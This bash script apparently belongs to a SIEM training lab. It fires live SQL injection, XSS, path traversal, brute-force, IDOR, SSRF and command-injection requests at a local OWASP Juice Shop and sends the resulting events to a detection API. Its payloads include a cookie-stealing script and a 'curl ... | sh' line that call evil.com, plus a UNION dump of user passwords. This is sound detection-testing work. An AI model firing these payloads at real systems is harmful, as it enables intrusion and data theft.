#!/usr/bin/env bash
# ============================================================
# ZOVARK SIEM Lab — Juice Shop Attack Script
# ============================================================
# Fires real attacks against OWASP Juice Shop and feeds the
# resulting SIEM events into the Zovark API for investigation.
#
# Prerequisites:
#   docker compose --profile siem-lab up -d   (starts juice-shop on :3001)
#   Zovark API running on :8090
#
# Usage:
#   ./siem-lab/attack_juice_shop.sh              # all attacks
#   ./siem-lab/attack_juice_shop.sh --sqli-only  # SQL injection only
#   ./siem-lab/attack_juice_shop.sh --quick      # 5 fast attacks
# ============================================================

set -euo pipefail

# ─── Configuration ───────────────────────────────────────────
JUICE_SHOP_URL="${JUICE_SHOP_URL:-http://localhost:3001}"
ZOVARK_API="${ZOVARK_API:-http://localhost:8090}"
ZOVARK_EMAIL="${ZOVARK_EMAIL:-admin@test.local}"
ZOVARK_PASSWORD="${ZOVARK_PASSWORD:-TestPass2026}"
SPACING="${SPACING:-5}"  # seconds between submissions

# Colors (disabled if not a terminal)
if [ -t 1 ]; then
    RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
    CYAN='\033[0;36m'; BOLD='\033[1m'; NC='\033[0m'
else
    RED=''; GREEN=''; YELLOW=''; CYAN=''; BOLD=''; NC=''
fi

# Counters
TOTAL=0
SUBMITTED=0
FAILED=0
TASK_IDS=()

# ─── Helpers ─────────────────────────────────────────────────

log_info()  { echo -e "${CYAN}[INFO]${NC}  $*"; }
log_ok()    { echo -e "${GREEN}[OK]${NC}    $*"; }
log_warn()  { echo -e "${YELLOW}[WARN]${NC}  $*"; }
log_err()   { echo -e "${RED}[ERR]${NC}   $*"; }
log_atk()   { echo -e "${RED}[ATK]${NC}   $*"; }

url_encode() {
    # Encode a string for safe use in URLs.
    # Tries python3 first, falls back to printf-based encoding.
    local raw="$1"
    python3 -c "import urllib.parse; print(urllib.parse.quote('$raw'))" 2>/dev/null \
        || python -c "import urllib; print(urllib.quote('$raw'))" 2>/dev/null \
        || printf '%s' "$raw" | sed 's/ /%20/g; s/'\''/%27/g; s/"/%22/g; s/</%3C/g; s/>/%3E/g; s/{/%7B/g; s/}/%7D/g; s/|/%7C/g; s/;/%3B/g'
}

timestamp() {
    date -u +"%Y-%m-%dT%H:%M:%SZ" 2>/dev/null || date +"%Y-%m-%dT%H:%M:%SZ"
}

# ─── Connectivity Checks ────────────────────────────────────

check_juice_shop() {
    log_info "Checking Juice Shop at ${JUICE_SHOP_URL} ..."
    local status
    status=$(curl -s -o /dev/null -w "%{http_code}" "${JUICE_SHOP_URL}/" --max-time 5 2>/dev/null || echo "000")
    if [ "$status" = "000" ]; then
        log_err "Juice Shop is not reachable at ${JUICE_SHOP_URL}"
        echo "    Start it with:  docker compose --profile siem-lab up -d"
        exit 1
    fi
    log_ok "Juice Shop responding (HTTP ${status})"
}

check_zovark_api() {
    log_info "Checking Zovark API at ${ZOVARK_API} ..."
    local status
    status=$(curl -s -o /dev/null -w "%{http_code}" "${ZOVARK_API}/health" --max-time 5 2>/dev/null || echo "000")
    if [ "$status" = "000" ]; then
        log_err "Zovark API is not reachable at ${ZOVARK_API}"
        echo "    Start it with:  docker compose up -d"
        exit 1
    fi
    log_ok "Zovark API responding (HTTP ${status})"
}

# ─── Authentication ──────────────────────────────────────────

get_token() {
    log_info "Authenticating as ${ZOVARK_EMAIL} ..."
    local resp
    resp=$(curl -s -X POST "${ZOVARK_API}/api/v1/auth/login" \
        -H "Content-Type: application/json" \
        -d "{\"email\":\"${ZOVARK_EMAIL}\",\"password\":\"${ZOVARK_PASSWORD}\"}" \
        --max-time 10 2>/dev/null)

    TOKEN=$(echo "$resp" | grep -o '"token":"[^"]*"' | head -1 | cut -d'"' -f4)
    if [ -z "$TOKEN" ]; then
        log_err "Authentication failed. Response: ${resp}"
        exit 1
    fi
    log_ok "Authenticated (token: ${TOKEN:0:20}...)"
}

refresh_token() {
    # Re-authenticate to avoid JWT expiry (15 min window)
    local resp
    resp=$(curl -s -X POST "${ZOVARK_API}/api/v1/auth/login" \
        -H "Content-Type: application/json" \
        -d "{\"email\":\"${ZOVARK_EMAIL}\",\"password\":\"${ZOVARK_PASSWORD}\"}" \
        --max-time 10 2>/dev/null)
    local new_token
    new_token=$(echo "$resp" | grep -o '"token":"[^"]*"' | head -1 | cut -d'"' -f4)
    if [ -n "$new_token" ]; then
        TOKEN="$new_token"
    fi
}

# ─── Submit Alert to Zovark ──────────────────────────────────

submit_to_zovark() {
    local task_type="$1"
    local severity="$2"
    local rule_name="$3"
    local prompt="$4"
    local source_ip="$5"
    local raw_log="$6"

    local ts
    ts=$(timestamp)

    local payload
    payload=$(cat <<ENDJSON
{
  "task_type": "${task_type}",
  "input": {
    "prompt": "${prompt}",
    "severity": "${severity}",
    "siem_event": {
      "title": "${rule_name}",
      "source_ip": "${source_ip}",
      "destination_ip": "172.17.0.5",
      "hostname": "JUICE-SHOP-01",
      "username": "attacker",
      "rule_name": "${rule_name}",
      "timestamp": "${ts}",
      "raw_log": "${raw_log}"
    }
  }
}
ENDJSON
)

    local resp
    resp=$(curl -s -X POST "${ZOVARK_API}/api/v1/tasks" \
        -H "Authorization: Bearer ${TOKEN}" \
        -H "Content-Type: application/json" \
        -d "$payload" \
        --max-time 30 2>/dev/null)

    local task_id
    task_id=$(echo "$resp" | grep -o '"task_id":"[^"]*"' | head -1 | cut -d'"' -f4)

    if [ -n "$task_id" ]; then
        TASK_IDS+=("$task_id")
        SUBMITTED=$((SUBMITTED + 1))
        log_ok "Submitted -> task_id: ${task_id}"
    else
        FAILED=$((FAILED + 1))
        log_err "Submit failed: ${resp:0:120}"
    fi
}

# ─── Fire HTTP attack and capture result ─────────────────────

fire_and_submit() {
    local attack_type="$1"    # sqli, xss, etc.
    local task_type="$2"      # Zovark task type
    local severity="$3"
    local rule_name="$4"
    local prompt="$5"
    local method="$6"
    local path="$7"
    local source_ip="$8"
    shift 8
    local extra_curl_args=("$@")

    TOTAL=$((TOTAL + 1))
    log_atk "[${TOTAL}] ${attack_type}: ${rule_name}"

    # Fire the actual HTTP request against Juice Shop
    local http_status body
    if [ "$method" = "GET" ]; then
        http_status=$(curl -s -o /tmp/zovark_atk_body.txt -w "%{http_code}" \
            "${JUICE_SHOP_URL}${path}" \
            --max-time 10 "${extra_curl_args[@]}" 2>/dev/null || echo "000")
    else
        http_status=$(curl -s -o /tmp/zovark_atk_body.txt -w "%{http_code}" \
            -X "$method" "${JUICE_SHOP_URL}${path}" \
            --max-time 10 "${extra_curl_args[@]}" 2>/dev/null || echo "000")
    fi
    body=$(head -c 200 /tmp/zovark_atk_body.txt 2>/dev/null | tr '\n' ' ' | tr '\r' ' ' | tr '"' "'" || echo "no-body")

    local raw_log="${method} ${path} HTTP/1.1 | Status: ${http_status} | Body: ${body}"

    echo "    -> Juice Shop responded HTTP ${http_status}"

    # Submit the captured event to Zovark for investigation
    submit_to_zovark "$task_type" "$severity" "$rule_name" "$prompt" "$source_ip" "$raw_log"
}

# ============================================================
# ATTACK CATEGORIES
# ============================================================

attacks_sqli() {
    echo ""
    echo -e "${BOLD}=== SQL INJECTION ATTACKS (7) ===${NC}"
    echo ""

    local src="10.0.1.50"

    fire_and_submit "sqli" "brute_force" "critical" \
        "WAF_SQLi_Login_classic" \
        "SQL injection login bypass: ' OR 1=1--" \
        "POST" "/rest/user/login" "$src" \
        -H "Content-Type: application/json" \
        -d '{"email":"'\'' OR 1=1--","password":"x"}'
    sleep "$SPACING"

    fire_and_submit "sqli" "brute_force" "critical" \
        "WAF_SQLi_Login_admin_comment" \
        "SQL injection login bypass: admin'--" \
        "POST" "/rest/user/login" "$src" \
        -H "Content-Type: application/json" \
        -d '{"email":"admin'\''--","password":"x"}'
    sleep "$SPACING"

    fire_and_submit "sqli" "brute_force" "critical" \
        "WAF_SQLi_Login_union" \
        "SQL injection UNION login bypass" \
        "POST" "/rest/user/login" "$src" \
        -H "Content-Type: application/json" \
        -d '{"email":"'\'' UNION SELECT 1,2,3--","password":"x"}'
    sleep "$SPACING"

    local encoded
    encoded=$(url_encode "' OR 1=1--")
    fire_and_submit "sqli" "data_exfiltration" "critical" \
        "WAF_SQLi_Search_or_bypass" \
        "SQL injection in product search: ' OR 1=1--" \
        "GET" "/rest/products/search?q=${encoded}" "$src"
    sleep "$SPACING"

    encoded=$(url_encode "'; DROP TABLE Products;--")
    fire_and_submit "sqli" "data_exfiltration" "critical" \
        "WAF_SQLi_Search_drop_table" \
        "SQL injection DROP TABLE in product search" \
        "GET" "/rest/products/search?q=${encoded}" "$src"
    sleep "$SPACING"

    encoded=$(url_encode "' UNION SELECT id,email,password,4,5,6,7,8,9 FROM Users--")
    fire_and_submit "sqli" "data_exfiltration" "critical" \
        "WAF_SQLi_Search_union_users" \
        "SQL injection UNION exfiltrating Users table" \
        "GET" "/rest/products/search?q=${encoded}" "$src"
    sleep "$SPACING"

    encoded=$(url_encode "')) OR 1=1--")
    fire_and_submit "sqli" "data_exfiltration" "critical" \
        "WAF_SQLi_Search_double_paren" \
        "SQL injection double-parenthesis bypass in search" \
        "GET" "/rest/products/search?q=${encoded}" "$src"
}

attacks_xss() {
    echo ""
    echo -e "${BOLD}=== CROSS-SITE SCRIPTING ATTACKS (5) ===${NC}"
    echo ""

    local src="10.0.2.100"

    local encoded
    encoded=$(url_encode "<script>alert('XSS')</script>")
    fire_and_submit "xss" "phishing" "high" \
        "WAF_XSS_script_tag" \
        "XSS attempt: script tag injection in search" \
        "GET" "/rest/products/search?q=${encoded}" "$src"
    sleep "$SPACING"

    encoded=$(url_encode "<img src=x onerror=alert(1)>")
    fire_and_submit "xss" "phishing" "high" \
        "WAF_XSS_img_onerror" \
        "XSS attempt: img onerror event handler" \
        "GET" "/rest/products/search?q=${encoded}" "$src"
    sleep "$SPACING"

    encoded=$(url_encode "<svg onload=alert(document.cookie)>")
    fire_and_submit "xss" "phishing" "high" \
        "WAF_XSS_svg_onload" \
        "XSS attempt: SVG onload cookie exfiltration" \
        "GET" "/rest/products/search?q=${encoded}" "$src"
    sleep "$SPACING"

    encoded=$(url_encode "<iframe src='javascript:alert(1)'>")
    fire_and_submit "xss" "phishing" "high" \
        "WAF_XSS_iframe_js" \
        "XSS attempt: iframe with javascript protocol" \
        "GET" "/rest/products/search?q=${encoded}" "$src"
    sleep "$SPACING"

    fire_and_submit "xss" "phishing" "high" \
        "WAF_XSS_stored_feedback" \
        "Stored XSS via feedback: cookie stealing script" \
        "POST" "/api/Feedbacks" "$src" \
        -H "Content-Type: application/json" \
        -d '{"comment":"<script>new Image().src='\''http://evil.com/'\''+document.cookie</script>","rating":1}'
}

attacks_path_traversal() {
    echo ""
    echo -e "${BOLD}=== PATH TRAVERSAL ATTACKS (5) ===${NC}"
    echo ""

    local src="10.0.3.15"

    fire_and_submit "path_traversal" "data_exfiltration" "high" \
        "WAF_PathTraversal_null_byte_ftp" \
        "Path traversal: null-byte bypass to access FTP backup" \
        "GET" "/ftp/package.json.bak%2500.md" "$src"
    sleep "$SPACING"

    fire_and_submit "path_traversal" "data_exfiltration" "high" \
        "WAF_PathTraversal_etc_passwd" \
        "Path traversal: attempting to read /etc/passwd" \
        "GET" "/../../../etc/passwd" "$src"
    sleep "$SPACING"

    fire_and_submit "path_traversal" "data_exfiltration" "high" \
        "WAF_PathTraversal_swagger" \
        "Path traversal: API documentation exposure" \
        "GET" "/api-docs" "$src"
    sleep "$SPACING"

    fire_and_submit "path_traversal" "data_exfiltration" "high" \
        "WAF_PathTraversal_encryption_keys" \
        "Path traversal: encryption key directory access" \
        "GET" "/encryptionkeys" "$src"
    sleep "$SPACING"

    fire_and_submit "path_traversal" "data_exfiltration" "high" \
        "WAF_PathTraversal_dotdot_package" \
        "Path traversal: dot-dot-slash to package.json" \
        "GET" "/assets/public/images/../../package.json" "$src"
}

attacks_brute_force() {
    echo ""
    echo -e "${BOLD}=== BRUTE FORCE ATTACKS (5) ===${NC}"
    echo ""

    local src="10.0.4.20"
    local passwords=("admin123" "password" "123456" "letmein" "qwerty")

    for i in "${!passwords[@]}"; do
        local pw="${passwords[$i]}"
        local n=$((i + 1))
        fire_and_submit "brute_force" "brute_force" "high" \
            "WAF_BruteForce_admin_${n}" \
            "Brute force login attempt ${n}/5 against admin@juice-sh.op with password ${pw}" \
            "POST" "/rest/user/login" "$src" \
            -H "Content-Type: application/json" \
            -d "{\"email\":\"admin@juice-sh.op\",\"password\":\"${pw}\"}"
        sleep "$SPACING"
    done
}

attacks_idor() {
    echo ""
    echo -e "${BOLD}=== IDOR ATTACKS (5) ===${NC}"
    echo ""

    local src="10.0.2.101"

    for basket_id in 1 2 3; do
        fire_and_submit "idor" "data_exfiltration" "medium" \
            "WAF_IDOR_Basket_${basket_id}" \
            "IDOR: unauthorized access to basket ${basket_id}" \
            "GET" "/rest/basket/${basket_id}" "$src"
        sleep "$SPACING"
    done

    for user_id in 1 2; do
        fire_and_submit "idor" "data_exfiltration" "medium" \
            "WAF_IDOR_UserProfile_${user_id}" \
            "IDOR: unauthorized access to user profile ${user_id}" \
            "GET" "/api/Users/${user_id}" "$src"
        sleep "$SPACING"
    done
}

attacks_ssrf() {
    echo ""
    echo -e "${BOLD}=== SSRF ATTACKS (3) ===${NC}"
    echo ""

    local src="10.0.3.16"

    fire_and_submit "ssrf" "data_exfiltration" "critical" \
        "WAF_SSRF_aws_metadata" \
        "SSRF: attempting to access AWS metadata endpoint" \
        "POST" "/profile/image/url" "$src" \
        -H "Content-Type: application/json" \
        -d '{"imageUrl":"http://169.254.169.254/latest/meta-data/"}'
    sleep "$SPACING"

    fire_and_submit "ssrf" "data_exfiltration" "critical" \
        "WAF_SSRF_localhost_users" \
        "SSRF: accessing localhost user data via profile image" \
        "POST" "/profile/image/url" "$src" \
        -H "Content-Type: application/json" \
        -d '{"imageUrl":"http://localhost:3001/api/Users"}'
    sleep "$SPACING"

    fire_and_submit "ssrf" "data_exfiltration" "critical" \
        "WAF_SSRF_admin_config" \
        "SSRF: accessing admin application config via loopback" \
        "POST" "/profile/image/url" "$src" \
        -H "Content-Type: application/json" \
        -d '{"imageUrl":"http://127.0.0.1:3001/rest/admin/application-configuration"}'
}

attacks_command_injection() {
    echo ""
    echo -e "${BOLD}=== COMMAND INJECTION ATTACKS (3) ===${NC}"
    echo ""

    local src="10.0.4.21"

    fire_and_submit "cmd_injection" "malware" "critical" \
        "WAF_CmdInjection_semicolon_ls" \
        "Command injection: semicolon + ls in profile field" \
        "POST" "/profile" "$src" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        -d "username=; ls -la /"
    sleep "$SPACING"

    fire_and_submit "cmd_injection" "malware" "critical" \
        "WAF_CmdInjection_pipe_cat_passwd" \
        "Command injection: pipe cat /etc/passwd" \
        "POST" "/profile" "$src" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        -d "username=| cat /etc/passwd"
    sleep "$SPACING"

    fire_and_submit "cmd_injection" "malware" "critical" \
        "WAF_CmdInjection_curl_reverse_shell" \
        "Command injection: curl pipe to sh reverse shell" \
        "POST" "/profile" "$src" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        -d "username=& curl http://evil.com/shell.sh | sh"
}

attacks_benign() {
    echo ""
    echo -e "${BOLD}=== BENIGN TRAFFIC (5) ===${NC}"
    echo ""

    local src="10.0.10.10"

    fire_and_submit "benign" "benign_activity" "low" \
        "APP_ProductSearch_apple" \
        "Normal product search for apple" \
        "GET" "/rest/products/search?q=apple" "$src"
    sleep "$SPACING"

    fire_and_submit "benign" "benign_activity" "low" \
        "APP_ProductSearch_juice" \
        "Normal product search for juice" \
        "GET" "/rest/products/search?q=juice" "$src"
    sleep "$SPACING"

    fire_and_submit "benign" "benign_activity" "low" \
        "APP_API_product_detail" \
        "Normal API call: product detail page" \
        "GET" "/api/Products/1" "$src"
    sleep "$SPACING"

    fire_and_submit "benign" "benign_activity" "low" \
        "APP_API_languages" \
        "Normal API call: language list" \
        "GET" "/rest/languages" "$src"
    sleep "$SPACING"

    fire_and_submit "benign" "benign_activity" "low" \
        "AUTH_Login_customer" \
        "Normal user login attempt" \
        "POST" "/rest/user/login" "$src" \
        -H "Content-Type: application/json" \
        -d '{"email":"customer@juice-sh.op","password":"customer123"}'
}

# ============================================================
# QUICK MODE (5 diverse attacks)
# ============================================================

attacks_quick() {
    echo ""
    echo -e "${BOLD}=== QUICK MODE: 5 diverse attacks ===${NC}"
    echo ""

    local src="10.0.1.50"

    # 1. SQLi
    fire_and_submit "sqli" "brute_force" "critical" \
        "WAF_SQLi_Login_classic" \
        "SQL injection login bypass: ' OR 1=1--" \
        "POST" "/rest/user/login" "$src" \
        -H "Content-Type: application/json" \
        -d '{"email":"'\'' OR 1=1--","password":"x"}'
    sleep "$SPACING"

    # 2. XSS
    local encoded
    encoded=$(url_encode "<script>alert('XSS')</script>")
    fire_and_submit "xss" "phishing" "high" \
        "WAF_XSS_script_tag" \
        "XSS attempt: script tag injection" \
        "GET" "/rest/products/search?q=${encoded}" "10.0.2.100"
    sleep "$SPACING"

    # 3. Path traversal
    fire_and_submit "path_traversal" "data_exfiltration" "high" \
        "WAF_PathTraversal_etc_passwd" \
        "Path traversal: /etc/passwd read attempt" \
        "GET" "/../../../etc/passwd" "10.0.3.15"
    sleep "$SPACING"

    # 4. Brute force
    fire_and_submit "brute_force" "brute_force" "high" \
        "WAF_BruteForce_admin" \
        "Brute force login against admin@juice-sh.op" \
        "POST" "/rest/user/login" "10.0.4.20" \
        -H "Content-Type: application/json" \
        -d '{"email":"admin@juice-sh.op","password":"admin123"}'
    sleep "$SPACING"

    # 5. Benign (control)
    fire_and_submit "benign" "benign_activity" "low" \
        "APP_ProductSearch_juice" \
        "Normal product search for juice" \
        "GET" "/rest/products/search?q=juice" "10.0.10.10"
}

# ============================================================
# MAIN
# ============================================================

main() {
    echo "============================================================"
    echo "  ZOVARK SIEM Lab — Juice Shop Attack Script"
    echo "============================================================"
    echo "  Juice Shop:  ${JUICE_SHOP_URL}"
    echo "  Zovark API:  ${ZOVARK_API}"
    echo "  Spacing:     ${SPACING}s between submissions"
    echo "============================================================"
    echo ""

    # Connectivity checks
    check_juice_shop
    check_zovark_api
    echo ""

    # Authenticate
    get_token
    echo ""

    # Parse mode
    local mode="${1:-all}"

    case "$mode" in
        --sqli-only)
            attacks_sqli
            ;;
        --xss-only)
            attacks_xss
            ;;
        --traversal-only)
            attacks_path_traversal
            ;;
        --brute-only)
            attacks_brute_force
            ;;
        --idor-only)
            attacks_idor
            ;;
        --ssrf-only)
            attacks_ssrf
            ;;
        --cmd-only)
            attacks_command_injection
            ;;
        --benign-only)
            attacks_benign
            ;;
        --quick)
            attacks_quick
            ;;
        --all|all|"")
            # Refresh token every category to avoid JWT expiry
            attacks_sqli
            refresh_token
            attacks_xss
            refresh_token
            attacks_path_traversal
            refresh_token
            attacks_brute_force
            refresh_token
            attacks_idor
            refresh_token
            attacks_ssrf
            refresh_token
            attacks_command_injection
            refresh_token
            attacks_benign
            ;;
        *)
            echo "Usage: $0 [--all|--quick|--sqli-only|--xss-only|--traversal-only|--brute-only|--idor-only|--ssrf-only|--cmd-only|--benign-only]"
            exit 1
            ;;
    esac

    # ─── Summary ─────────────────────────────────────────────
    echo ""
    echo "============================================================"
    echo "  ATTACK SUMMARY"
    echo "============================================================"
    echo "  Total attacks fired:   ${TOTAL}"
    echo "  Submitted to Zovark:   ${SUBMITTED}"
    echo "  Failed submissions:    ${FAILED}"
    echo "  Task IDs recorded:     ${#TASK_IDS[@]}"
    echo "============================================================"
    echo ""

    if [ ${#TASK_IDS[@]} -gt 0 ]; then
        echo "Task IDs (for monitor_results.sh):"
        for tid in "${TASK_IDS[@]}"; do
            echo "  $tid"
        done
        echo ""
        echo "Monitor results with:"
        echo "  ./siem-lab/monitor_results.sh"
        echo ""
        echo "Or poll a single task:"
        echo "  curl -s -H \"Authorization: Bearer \${TOKEN}\" ${ZOVARK_API}/api/v1/tasks/${TASK_IDS[0]}"
    fi

    # Save task IDs to file for the monitor script
    if [ ${#TASK_IDS[@]} -gt 0 ]; then
        printf '%s\n' "${TASK_IDS[@]}" > /tmp/zovark_siem_lab_tasks.txt
        echo ""
        log_info "Task IDs saved to /tmp/zovark_siem_lab_tasks.txt"
    fi

    # Clean up temp file
    rm -f /tmp/zovark_atk_body.txt
}

main "$@"
